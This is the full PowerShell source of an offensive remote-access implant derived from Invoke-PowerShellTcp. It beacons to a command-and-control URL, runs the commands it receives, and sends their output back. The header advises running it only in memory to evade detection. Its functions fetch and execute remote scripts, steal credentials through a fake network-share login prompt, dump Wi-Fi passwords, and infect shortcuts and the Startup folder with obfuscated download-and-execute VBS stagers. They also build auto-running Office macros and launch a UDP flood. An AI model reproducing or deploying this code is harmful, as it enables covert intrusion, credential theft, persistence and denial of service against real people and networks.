<#
async shell client

Code derived from Invoke-PowerShellTcp, written
by Nikhil "SamratAshok" Mittal ( GPLv3 ).

It has since been heavliy modified, the direct tcp socket communication was scrapped in favor of HTTP/S request 
communication to the cgi app. This was done to make communication asynchronous which should persist over sporatic 
internet connections. It goes to sleep when it cannot contact the server and makes periodic checks every 5 minutes.

It works over https and has the ability to ignore cert checking, this was done for compatibility with self-signed 
certificates (use caution!). The code is self contained without one needing to pass any parameters, just the the 
web server ip hosting this script in the IEX.

The changes were made to help make proxing of communication easier. Insure this file is only executed in memory 
via iex to decrease the likelihood of detection.

xor-function
#>

function start-aclient {


	# Set ip address or domain hosting the null-shell cgi app.
	$uri = 'https://192.168.43.150/gm432GiS.pl' #[->] Change this example

	# set the key that matches the one set on the cgi handler inside single quotes
	$key = 'SWFfeXE3cnNDenRYek03SGU5WnNabXNSZmt4SFk4' #[->] Change this example

	# place your ssl key fingerprint here to perform manual key validation
	$certfingerprint = 'CD6F822BC1728C2DE5BC874913B67CA07463C40D' #[->] Change this example

	# user-agent variable, change this to avoid signatures
	$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"

function send-request {

	param($request)

	# This turns off https cert checking in order to work with Self Signed Certificates. 
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

	$webclient = New-Object System.Net.WebClient
	$webclient.headers.add("User-Agent", $agent)
	$encstring = $webclient.Downloadstring($request)

	# command below turns https cert checking back on
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }

	$string = base64string-decode $encstring

	return $string

}

function check-certprint {

	param($urlTocheck)

	# This turns off https cert checking in order to work with Self Signed Certificates.
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

	$millisecs = 5000
	$req = [Net.HttpWebRequest]::Create($urlTocheck)
	$req.UserAgent = $agent
	$req.Timeout = $millisecs

	# pipe getresponse response to close connection prevents lock ups
	$response = $req.GetResponse()
	$response.close()
	
	$keyfingerprint = $req.ServicePoint.Certificate.GetCertHashString()

        # command below turns https cert checking back on
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $null }

	return $keyfingerprint

}

function decide-sendRequest {

	param($request)

	$keyprint = check-certprint $uri
        if ( "$keyprint" -eq "$certfingerprint" )  { $cmdString = send-request $request } else { throw "CERT CHECK FAILED!" }

	# Uncomment the below to debug
	# write-host server thumbprint [ $keyprint ]
	# write-host client thumbprint [ $certfingerprint ]

	return $cmdString

}

function base64url-encode {

	param($rawstring)

	# Striping unsafe characters from url, also escaping the plus sign
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($rawstring))
	$rmequal = $encstring -replace '=', '!'
	$rmslash = $rmequal -replace '/', '_'
	$rmplus  = $rmslash -replace '\+', '-'

	$encurl = $rmplus

	return $encurl
}

# encode a string with base64 to prep for obfuscation do not use this for encoded commands since UTF8
function base64string-encode {

	param($string)

	# Use this to encode strings to base64 format
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

	return $encstring
}

function base64string-decode {

	param($encstring)

	# Don't have to worry about unsafe url characters since it's content not a url string
	$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

	return $decstring
}

function gen-key {

	$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
	1..70 | % { $rchr += $charArray | get-random }
	$randkey = [string]::join("", ($rchr))

	return $randkey

}

function set-sysname {

	#[->] register machine to server

	#[->] Some optional markers listed for reference...
	# $biosversion = gwmi win32_bios | select -expand SMBIOSBIOSVersion
	# $serial = gwmi win32_bios | select -expand SerialNumber

	$rawmac = ((gwmi win32_networkadapter -Filter "AdapterType LIKE 'Ethernet 802.3'") | select -expand macaddress )
	$mac = $rawmac -replace "\W", '-'

	$name = $env:computername
							    #[->] Example date Feb 7 at 9:32:05 pm 
	$regtime = get-date -uformat "%m%d%H%M%S"   #[->] The time format is [month 02 | day 07 | hour 21 | minute 32 | second 05] [0207213205]
	$sysname = $name + "-" + $mac + "-" + $regtime

	return $sysname
}

function show-help {

	$helpSummary = @"

get-info
	Displays a summary of current host

exec-script "name-of-script"
	Executes script hosted server side in /var/async-shell/ps-scripts by 
	IEX requires the name of the script filename as a parameter.

obfuscate "name of text file / script"
	Uses a polyalphabetic obfuscation method on base64 strings writes 
	obfuscated string to file and provides a de-obfuscation key.

de-obfuscate "(name of text file / script), (key)"
	Performs the inverse of the obfuscation function requires the text 
	file with the obfuscated base64 data and de-obfuscation key as parameters.

gen-key
	generates a random alphabetic string for use with the obfuscate-base64 function.

obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)" 
	The function that contains the obfuscation engine, it works only with clear base64 data.

byte-encode ( binary-to-obfuscate, key )
	Performs byte-encoding prior to converting to obfuscated base64 provide 
	key de-obfuscation.

byte-decode ( file-containing-obfu-base64, key )
	performs the reverse of byte-encode, requires the de-obfuscation key.

askfor-creds
	Performs some social engineering in order to aquire plain-text credentials. 
	This is done by generating a authentication popup which seems to 
	reconnect to a network share.
	
dump-wificreds
	Dumps plain text passwords for avaliable wireless network profiles.
	For this to work this code must be executed as an administrator.

shortcut-infect "name-of-lnk" "Url-hosting-script"
	Modifies the specified shortcut to run the original program and also execute a 
	download and execute command string. 
	
	Example: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
	
	Requires the http:// or https:// in the URL.
	
gen-enccmd "your command string"
	Generates a PowerShell formatted encoded command. Insure to quote your command string.
	
	example: gen-enccmd "cmd /c ipconfig /all"

dec-enccmd [Your encoded command string ] 
	Decodes the base64 string and displays the original string.


"@

	return $helpSummary

}

function get-info {

	$domain = $env:UserDomain
	$LogOnServer = $env:LogOnServer
	$userName = $env:UserName
	$machineName = $env:ComputerName

	$OS = (gwmi Win32_OperatingSystem).caption
	$SysDescription = (gwmi Win32_OperatingSystem).description
	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
	$PsVersion = $PSVersionTable.PSVersion.Major

	# Create table of AV software
	$avServices = @{"symantec" = "Symantec"; 
			"navapsvc" = "Norton";
			"mcshield" = "McAfee"; 
			"windefend" = "Windows Defender";
			"savservice" = "Sophos";
			"avp" = "Kaspersky";
			"SBAMSvc" = "Vipre";
			"avast!" = "Avast";
			"fsma" = "F-Secure";
			"antivirservice" = "AntiVir";
			"avguard" = "Avira";
			"fpavserver" = "F-Protect";
			"pshost" = "Panda Security";
			"pavsrv" = "Panda AntiVirus";
			"bdss" = "BitDefender";
			"avkproxy" = "G_Data AntiVirus";
			"klblmain" = "Kaspersky Lab AntiVirus";
			"vbservprof" = "Symantec VirusBlast";
			"ekrn" = "ESET";
			"abmainsv" = "ArcaBit/ArcaVir";
			"ikarus-guardx" = "IKARUS";
			"clamav" = "ClamAV";
			"aveservice" = "Avast";
			"immunetprotect" = "Immunet";
			"msmpsvc" = "Microsoft Security Essentials";
			"msmpeng" = "Microsoft Security Essentials";
	}
	
	#[->] generate summary of client
	$summary  = "============[ System Summary ]==============`n"
	$summary += "Domain       : $domain`n"
	$summary += "LogOn Server : $LogOnServer`n"
	$summary += "User Name    : $userName`n"
	$summary += "ComputerName : $machineName`n"
	$summary += "Admin        : $IsAdmin`n"
	$summary += "PS version   : $PsVersion`n"
	$summary += "OS version   : $OS`n"
	$summary += "Description  : $SysDescription`n"
	$summary += "======[ Detected Antivirus Services ]=======`n"

	#[->] get current services
	$services = (gwmi win32_service).name

	foreach ($S in $avServices.GetEnumerator()) {			
		if ( $services -match $($S.Name) ) { $summary += "$($S.Name): $($S.Value)`n" }
	}

	write-output $summary

}

function exec-script {

	param($scriptName)

	if ($scriptName ) {
	#[->] send name of powershell script to retrive from C&C server then execute.

		$encScriptName = base64url-encode $scriptName

        	$getScript = $uri + "?auth=" + $enckey + "&ld=" + $encScriptName
		$string = decide-sendRequest $getScript

        	if ( $string -match '404' ) { write-output = '[!] script not avaliable on your control server!' } 
		else {

			iex -command $string 
			if ($?) { write-output "[+] ps code executed!" } 
			else { write-output "[!] something went wrong! load failed!" } 
		}

	} else { write-output "[!] You need to specify the name of script! EX: load-script NameOfScript" }

}

#[->] byte encoding decoding are for dealing with binary obfuscation
function byte-encode {

	param($binaryPath)

	$test = Test-Path $binaryPath -IsValid

	if ($test -eq $True)
	{

		$binBytes = get-content -Path $binaryPath -Encoding Byte
		$binb64String = [System.Convert]::ToBase64String($binBytes)

		$key = gen-key

		$obfuscated = obfuscate-base64 hide $key $binb64String
		$obfuscated > 'New-File.txt'

		$report = "[!] Key generated is : $key `n"
		$report += "[!] wrote obfuscated data to New-File.txt!"

		write-output $report

	}


}

#[->] recovers binaries encoded in obfuscated base64 strings  
function byte-decode( $b64file, $key ) { 

	if ($key) {

		$test = Test-Path $b64file -IsValid

		if ($test -eq $True)
		{

			$obfb64string = get-content $b64file | Out-String
			$deobfuscated = obfuscate-base64 clear $key $obfb64string

			$bytes = [System.Convert]::FromBase64String($deobfuscated)
			set-content -Path .\change-extension -Value $bytes -Encoding Byte
			
			write-output "[!] created new binary change the extension manually!"

		}

	} else { write-output "[!] Failed! : The required key was not provided." }

}

function dump-wifiCreds {

	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
	if ($IsAdmin) 
	{ 

		$rawp = (netsh wlan show profiles) | where { $_  -match "All User Profile" }
		$profileData = "`n"		
		foreach ( $a in $rawp) 
		{ 

			$profile = $a.split(':')[1].trim()
			$pdata = (netsh wlan show profiles name=$profile key=clear) | where { $_ -match "Key Content" }
	
			if ($pdata) 
			{ 
				$password = $pdata.split(':')[1].trim()
				$profileData += "[+] Network: [ $profile ] || Pass: [ $password ] `n"
			}
		
		}
		
		return $profileData

	} else {  $notAdmin = "`n[!] You have to run this function as Admin to get plain text creds! `n"; return $notAdmin }

}

#[->] thx Mubix for the idea ;)
function askfor-creds {

	[int]$cnt = 1
	
	while ( $cnt -lt '4' ) {

		$user    = [Environment]::UserName
		$domain  = [Environment]::UserDomainName	

		$credentials = $Host.UI.PromptForCredential('Reconnect to Network Share','',$user,[Environment]::UserDomainName)
		$pass = $credentials.getnetworkcredential().password

		if ((gwmi win32_computersystem).partofdomain -eq $true ) {

			Add-Type -assemblyname system.DirectoryServices.AccountManagement
			$cntxtdom = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
			$chkdom = $cntxtdom.ValidateCredentials($user,$pass)

			if ( $chkdom -eq $false ) {
			
				Add-Type -AssemblyName System.Windows.Forms
				$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed, please enter correct password.", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
			
			} else { break }
			
		} else {

			Add-Type -assemblyname system.DirectoryServices.AccountManagement 
			$localMachine = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
			$credtest = $localMachine.ValidateCredentials($user,$pass)

			if ( $credtest -eq $false ) { 
			
				Add-Type -assemblyname System.Windows.Forms
				$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password.", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
			
			} else { break }

		}

		$cnt++

	}
	
	if ( $cnt -eq '4' ) {

		$summary = "[!] Attempt failed! Exceeded login attempts."

	} else {

		$summary = "[!] Successfully authenticated with domain! `n"
		$summary += '[>] Domain\UserName: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass

	}
	
	return $summary

}

function launch-udpFlood {

	[CmdletBinding()] Param(
	
	[Parameter(Position=0)]
	[String]$targetIP

	)

	## Check IP variable
	if ($targetIP) {
	
		# launch udp flood on range of ports
		foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }

	} else { write-output "[!] target IP not specified, required!" }
	
}

function udpEngine {

	[CmdletBinding()] Param(
	
	[Parameter(Position=0, Mandatory = $true)]
	[String]$tIP,
	
	[Parameter(Position=1, Mandatory = $true)]
	[String]$prt
	
	)
	
	$address = [system.net.IPAddress]::Parse( $tIP )  

	# Create IP Endpoint   
	$end = New-Object System.Net.IPEndPoint $address , $prt 

	# Create Socket   
	$Saddrf    = [System.Net.Sockets.AddressFamily]::InterNetwork  
	$Stype    = [System.Net.Sockets.SocketType]::Dgram  
	$Ptype     = [System.Net.Sockets.ProtocolType]::UDP  
	$Sock      = New-Object System.Net.Sockets.Socket $saddrf , $stype , $ptype   
	$Sock.TTL = 26
  
  
	while ($true) {
  
	  
		# Connect to socket   
		$sock.Connect( $end )  

		# Create encoded buffer insert loop here that get data from the generated file
		$Enc = [System.Text.Encoding]::ASCII
		$Message = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890" * 700
		$Buffer  = $Enc.GetBytes( $Message )  

		# Send the buffer   
		$Sent   = $Sock.Send( $Buffer )  
		
		
	
	}

}

function gen-enccmd {

	param($clrcmd)

	$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString()) 
	$enccmd = [Convert]::ToBase64String($bytescmd) 

	return $enccmd
}

#[->] decodes a powershell formatted encoded command
function dec-enccmd {

	param($enccmd)

	$cmdString = [System.Text.Encoding]::Unicode.getString([System.Convert]::Frombase64String($enccmd))

	return $cmdString
}

#[->] pass a sentence as a string so it can be spoken by the system
function say-this {

	param($s)

	if ($s) {

		$voice = new-object -com SAPI.SpVoice
		$voice.speak("$s")

	} else { write-output "[!] you need to specifiy what you want said in quotes. Ex say-sentece < your sentence >" }

}

# [->] vbs code generator, the obfuscation engine core algo
function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {

	$newline = "`r`n"
	
    	#[->] Obfuscate command string for wscript shell
    	$cmdstrArray = @()
    	[int]$ccnt = '1'
	$cmdfile = $newline	
	
    	foreach ( $char in $cmdstring.GetEnumerator() ) 
	{
		
		#[->] translate to ascii value then do math ops on it
        	$val = [Byte][Char]$char
        	$rnum = get-random -max 9 -min 1
        	$nval = [int]$val - [int]$rnum
        	$hval = [int]$nval / '2'
		
		if ( [int]$ccnt -eq '1' )
		{

			#[->] genrate random variable name then append it to array
			$rvarstr = rand-str
			$rvarstr += rand-str
			$cmdstrArray += $rvarstr
			$cmdfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
			
		} else {
		
			$cmdfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
		
		}
		
		#[->] create random legnth of char use
		$randval = get-random -max 12 -min 1
        	if ( $randval -eq '8' ) { $cmdfile += $newline; [int]$ccnt = 0 }
       		$ccnt++	

	}
	
    	#[->] concatinate vars to single command string

    	[int]$cnt = 1
    	foreach ( $randvar in $cmdstrArray )
	{
		
		if ( $cnt -eq '1' )
        	{
        		$mainRvar = rand-str
        		$cmdfile += $newline
            		$cmdfile += $mainRvar + ' = ' + $randvar

        	} else { $cmdfile += ' + ' + $randvar }
       		$cnt++

	}

	
	if ( $sType -eq 'vbs' ) 
	{

        	#[->] set variables for template generation
        	$vbsCode = $newline

        	#[->] initialize first function in vbs script
        	$randfunc = rand-str
        	$vbsCode += 'Function ' + $randfunc + '() ' + $newline

        	#[->] Insert obfuscated command string.
        	$vbsCode += $cmdfile

        	#[->] initalize file system object
        	$fso = rand-str
        	$vbsCode += $newline
        	$vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
        	$vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
        	$vbsCode += 'End Function' + $newline
        	$vbsCode += $randfunc
			
        	#[->] vbs script in "vbsCode" is ready to be written to disk

		return $vbsCode
		
	}

	if ( $sType -eq 'vba' ) 
	{

		#[->] set variables for template generation
        	$newline = "`r`n"
        	$vbaCode = $newline

        	#[->] initialize first function in vbs script
        	$randfunc = rand-str
        	$vbaCode += 'Sub ' + $randfunc + '() ' + $newline

		#[->] Insert obfuscated command string.
        	$vbaCode += $cmdfile

		#[->] initalize file system object
        	$fso = rand-str
        	$vbaCode += $newline
		$vbaCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
        	$vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
        	$vbaCode += 'End Sub' + $newline

      		#[->] Set different syntax based upon macro type word vs execl
        	if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
        	if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }

		#[->] vba script is ready

        	return $vbaCode

    	}

} # end obfuscate-cmdstring

#[->] requires the name of the shortcut along with a url hosting your PS script
#[->] example: shortcut-Infect "Chrome.lnk" "https://your-domain.com/ps-script"
function shortcut-infect($shortcutFullname, $scriptUrl) {

	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) 
	{ 

                #[->] suppress error messages, makes debugging less annoying
                #[->] uncomment the code inside catch for more uniform error msg
		try { 

			$f = Get-Item $shortcutFullName -erroraction 'silentlycontinue'
                	$fh = $f.OpenWrite()

		} catch { 
			
			$msg = "[!] cannot write to file!"
			return $msg
                        #Write-Warning "Something went wrong!"
                        #Write-Error $_

		}

		if($fh){ $fh.Close() } else { return }
	
		write-output "[*] Infecting shortcut...."

		#[->] extracting original properties from selected icon
		$wsh = New-Object -COM WScript.Shell
		$targetPath = $wsh.CreateShortcut("$shortcutFullname").TargetPath

		$chklnk = 'C:\\windows\\system32\\cmd.exe /c'
		if ( $targetPath -match $chklnk ) { $msg = "[!] This lnk is already done"; return $msg } 

		$workingDir = $wsh.CreateShortcut("$shortcutFullname").WorkingDirectory
	
		#[->] Get name of binary without full path to use as icon target
		$targetBinary = (gci $targetPath -force).Name

		#[->] prep command download string to be passed to obfuscation engine
		$cmdstring = persistent-stager $scriptUrl
		
		#[->] Obfuscate first wscript command string
		$vbsfile = obfuscate-cmdstring $cmdstring 'vbs'
		
            	$newline = "`r`n"
		$vbsfile += $newline
	
		#[->] initialize second function 
		$randfunc2 = rand-str
		$vbsfile += 'Function ' + $randfunc2 + '() ' + $newline
		$fso2 = rand-str
		$vbsfile += 'set ' + $fso2 + ' = ' + 'createObject("wscript.shell")' + $newline
		$vbsfile += $fso2 + '.run ' +  '"' + 'cmd /c ' + 'start ' + $targetBinary +  '"' + ',' + ' 0, ' + 'false' + $newline
		$vbsfile += 'End Function' + $newline
		$vbsfile += $randfunc2
	
		#[->] vbs script in "vbsfile" is ready to be written to disk
		#[->] create vbs script then change attribute to hidden
		$saveDir = (gci $shortcutFullname).DirectoryName + '\'
	
		$rand = rand-str; $vbsName = $rand + '.vbs'
		$vbspath = $saveDir + $vbsName
	
		set-content $vbspath $vbsfile -Encoding ASCII
		$vbsAtt = get-item $vbspath
		$vbsAtt.attributes="Hidden"
	
		#[->] Delete original shortcut 
		Remove-Item $shortcutFullname
	
		#[->] Modify values acquired from original shortcut 
		$wsh2 = New-Object -COM WScript.Shell
		$newSc = $shortcutFullname
		$newShortcut = $wsh2.CreateShortcut("$newSc")
		$newShortcut.TargetPath = "c:\windows\system32\cmd.exe"
		$newShortcut.WorkingDirectory = $workingDir

		#[->] Set shortcut arguments	
		$args = '/c ' + '"' + $vbspath + '"'
		$newShortcut.Arguments = "$args"
		$newIcon = $targetPath + ',0'
		$newShortcut.IconLocation = "$newIcon"
		$newShortcut.Save();

		$msg = "[+] finished injecting command string into shortcut."
		return $msg

	} else { $msg = "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script"; return $msg }

}

function simple-persistence($scriptUrl) {

	if ($scriptUrl) 
	{ 
	
		if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
		{ 
		
			#[->] insure cmd string is working or not before intensive debugging
			$cmdstring = persistent-stager $scriptUrl
		
			#[->] create vbs script then change attribute to hidden
			$saveDir = $env:appdata + '\Microsoft\Windows\start menu\programs\Startup\'
			
			#[->] insure cmd string is working or not before intensive debugging
			$vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
			$rand = rand-str; $vbsName = $rand + '.vbs'
			$vbspath = $saveDir + $vbsName
	
			set-content $vbspath $vbsCode -Encoding ASCII
			write-output "[+] finished generating obfuscated persistent stager."
			
		} else { 
			
			write-output "[!] FAilED!`n[!]You need to use a proper URL" 
			write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script" 
		}
		
	} else { 
		
		$usage =  "`n" + '[=>] Ex: RSH => C:\> simple-persistence "https://your-domain.com/ps-script"' + "`n"
		$usage += '[=>] drops an obfuscated vbs script to the windows startup folder.' + "`n"
		$usage += '[=>] Insure that the script is self contained and does not need additional parameters' + "`n"
		$usage += '[=>] for the C2 ip/port etc...' + "`n"
		
		write-output $usage
		
	}

}

# action = hide or clear
# key = encrpytion or decryption string
# string = base64 string to either be encrypted or decrypted

function obfuscate-base64( $action, $key, $string ) {

	$alpha = @{ "1" = "A";
		"2" = "B";
		"3" = "C";
		"4" = "D";
		"5" = "E";
		"6" = "F";
		"7" = "G";
		"8" = "H";
		"9" = "I";
		"10" = "J";
		"11" = "K";
		"12" = "L";
		"13" = "M";
		"14" = "N";
		"15" = "O";
		"16" = "P";
		"17" = "Q";
		"18" = "R";
		"19" = "S";
		"20" = "T";
		"21" = "U";
		"22" = "V";
		"23" = "W";
		"24" = "X";
		"25" = "Y";
		"26" = "Z"; 
	}

	$inv_alpha = @{}

	#[->] create another hash table like alpha but with inverted values
	foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)}

	$count = 0
	foreach ($ch in $string.GetEnumerator()) 
	{

		$c = [string]$ch
		if ( $c -match '[a-zA-Z]') 
		{

			$ival = $inv_alpha[$c]
			$s = $key[$count]

			if (!$s) { $count = 0; $s = $key[0] }  # reset key to begining

				#[->] juggling variable formats between integer and string methods
				$ss = [string]$s
				$S = $ss.ToUpper()
				$shift = $inv_alpha[$S]

				if ($action -match 'hide' ) 
				 { $val = [int]$ival + [int]$shift } 
				 else { $val = [int]$ival - [int]$shift } 

				if ( [int]$val -lt '1'  ) { $val = [int]$val + '26' }
				if ( [int]$val -gt '26' ) { $val = [int]$val - '26' }

				#[->] juggling variable formats between integer and string methods
				$sval = [string]$val
				$char = $alpha[$sval]
				$schar = [string]$char

				if ( $c -cmatch '[a-z]' )
					  { $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) }
				elseif ( $c -cmatch '[A-Z]' )
					  { $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) }

				$count++

			} else { $ncipher += [string]::join("", ($c)) }

	}

	$scipher = [string]$ncipher
	return $scipher

}

#[->] requires file name and file path if not in the same running directory
function obfuscate {

	param($filePath)

	$test = Test-Path $filePath -IsValid

	if ($test -eq $True)
	{

		$fileBytes = get-content -Path $filePath -Encoding Byte
		$base64String = [System.Convert]::ToBase64String($fileBytes)

		$nKey = gen-key
		$action = 'hide'

		$obfuscated = obfuscate-base64 ( $action, $nkey, $base64String )
		$obfuscated > 'New-File.txt'

		$report = "[!] Key generated is : $nKey"
		$report += "[!] wrote obfuscated data to New-File.txt!"

		return $report

	} else { $report = "[!] File path is not valid!"; return $report }

}

function de-obfuscate ( $filePath, $key ) {

	if ($key)
	{

		$test = Test-Path $filePath -IsValid
		if ($test -eq $True)
		{

			$fileString = get-content $filePath | Out-String
                	$action = 'clear'

			$obfuscated = obfuscate-base64 ( $action, $key, $fileString )
			$obfuscated > 'New-File.txt'

			$report = "[!] Key generated is : $nKey"
			$report += "[!] wrote obfuscated data to New-File.txt!"

			return $report

		} else { $report = "[!] File path is not valid!"; return $report }


	} else { $report = "[!] You need to provide a de-obfuscation key!"; return $report } 

}

function proc-loop {

	$hostname = set-sysname
	$enchostname = base64url-encode $hostname
	$enckey = base64url-encode $key
	$enroll = $uri + "?auth=" + $enckey + "&reg=" + $enchostname
	$bucket = decide-sendRequest $enroll

	while (1)
	{
		try
		{

			#[->] Pull command to be executed by this client
			$getcmd = $uri + "?auth=" + $enckey + "&get=" + $enchostname
			$cmd = decide-sendRequest $getcmd

			#[->] Ignore running the same command repeatedly, when server is unmanned.
			if ( -not ("$oldcmd" -eq "$cmd")) {

				#[->] setting previous encoded command
				$oldcmd = $cmd

				if ( "$cmd" -notmatch 'ftp' ) {

					#[->] Execute the command on the client.
                			$sendback = (Invoke-Expression -Command "$cmd" 2>&1 | Out-String )

				} else { $sendback = 'The windows ftp client is not supported in async mode' } 

				#[->] prep output to be uploaded, encoding not moved into request function.         	
				$encstdout = base64url-encode $sendback

				#[->] Check base64 encoded string length and trim it if too close to url character limit, allow room.
				if ( $encstdout.length -gt 65000 ) { 
					$encstdout = $encstdout.substring(0, [System.Math]::Min(65000, $encstdout.length))
				}

				#[->] Upload the stdout of executed command to server
				$upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
				$bucket = decide-sendRequest $upload

			}

		}

		catch
		{
			#[->] uncomment warnings below for debugging
			# Write-Warning "Something went wrong with execution of command via client."
			# Write-Error $_

			$x = ($error[0] | Out-String)
			$error.clear()

			if ( $x -match 'CERT CHECK FAILED!' ) { exit } else { $error = 'COMMAND FAILED!!! Waiting for 60 seconds before checking back in.' }

				$senderror = $error + $x
				$encstdout = base64url-encode $senderror

				#[->] Upload the stdout of executed command to server
				$upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
				$bucket = decide-sendRequest $upload

				Start-Sleep -s 60

		}

		Start-Sleep -s 5

	}

}

while (1)
{

	try
	{
		proc-loop
	}
        catch
	{
		#[->] uncomment warnings below for debugging
		# Write-Warning "Attempting to contact $uri failed do you have the null-shell cgi set up?, will retry."
		# Write-Error $_
		Start-Sleep -s 300
	}

}

}
start-aclient
